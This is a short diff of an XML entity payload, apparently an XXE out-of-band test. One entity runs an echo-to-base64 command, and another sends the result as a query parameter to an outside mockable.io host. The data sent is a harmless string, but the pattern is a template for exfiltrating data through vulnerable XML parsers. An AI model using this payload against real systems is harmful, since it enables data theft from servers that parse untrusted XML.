@@ -1,2 +1,2 @@
-<!ENTITY % three SYSTEM "echo -n 'scottlinux.com rocks' | base64">
+<!ENTITY % three SYSTEM "/usr/bin/echo -n 'scottlinux.com rocks' | /usr/bin/base64">
 <!ENTITY % two "<!ENTITY four SYSTEM 'http://demo6986808.mockable.io/?test=%three;'>">
